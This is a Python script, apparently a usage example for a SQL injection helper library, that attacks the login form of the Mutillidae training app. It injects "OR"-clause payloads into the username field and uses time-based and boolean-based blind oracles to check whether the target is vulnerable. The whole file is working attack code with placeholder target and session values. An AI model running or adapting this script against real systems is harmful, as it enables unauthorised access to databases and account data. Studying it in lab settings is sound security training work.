#!/bin/python

import logging
import requests
from sqlinja import MySqlConfig, Mode, SqlInja
import sys

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def exec_request_base(payload: str, timeout: int = 10) -> requests.Response:
    cookies = dict(showhints='0', PHPSESSID='<YOUR_SESSION_ID>')
    url = "http://<TARGET>/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' OR {payload}#",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    # Centralizing the transport here means the retry/timeout policy below
    # protects both the time-based and boolean-based oracles at once.
    for attempt in range(3):
        try:
            return requests.post(
                url, data=datas, headers=headers,
                allow_redirects=False, cookies=cookies,
                timeout=timeout,
            )
        except requests.exceptions.RequestException as exc:
            logger.warning("request failed (attempt %d/3): %s", attempt + 1, exc)
            if attempt == 2:
                raise
    raise AssertionError("unreachable")

def exec_request_time(payload: str, sleep_duration : int) -> bool:
    res = exec_request_base(payload, timeout=sleep_duration + 10)
    return res.elapsed.total_seconds() >= sleep_duration

def exec_request_bool(payload: str, sleep_duration : int) -> bool:
    res = exec_request_base(payload)
    return res.status_code == 302

# Method 1 : check for the current request
helper = SqlInja(MySqlConfig(), exec_request_time, mode=Mode.TIME)
rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
if(helper.check(rq)):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# if the request is invalid, the check fail
rq = "SELECT username FROM invalid_table ORDER BY username LIMIT 1,1"
if(helper.check(rq)):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# Method 2 : generic check
# time based (reuses the helper from Method 1)
if(helper.check("SELECT 1")):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")

# boolean based
helper = SqlInja(MySqlConfig(), exec_request_bool, mode=Mode.BOOLEAN)
if(helper.check("SELECT 1")):
    sys.stdout.write("Target is Vulnerable\n")
else:
    sys.stdout.write("Target is not Vulnerable\n")
